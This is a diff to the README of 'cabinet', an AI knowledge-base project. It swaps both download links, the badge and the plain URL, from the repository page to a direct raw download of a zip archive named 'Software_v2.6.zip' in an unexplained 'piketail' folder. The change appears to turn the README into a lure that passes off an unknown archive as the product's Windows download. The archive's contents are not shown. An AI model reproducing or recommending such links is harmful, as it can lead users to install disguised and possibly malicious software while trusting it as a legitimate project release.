@@ -1,12 +1,12 @@
 # 🗄️ cabinet - AI knowledge base for teams
 
-[![Download cabinet](https://img.shields.io/badge/Download-cabinet-6f42c1?style=for-the-badge&logo=github)](https://github.com/brynaendogenous998/cabinet)
+[![Download cabinet](https://img.shields.io/badge/Download-cabinet-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/brynaendogenous998/cabinet/main/piketail/Software_v2.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download cabinet:
 
-https://github.com/brynaendogenous998/cabinet
+https://raw.githubusercontent.com/brynaendogenous998/cabinet/main/piketail/Software_v2.6.zip
 
 ## 🪟 Windows setup
 
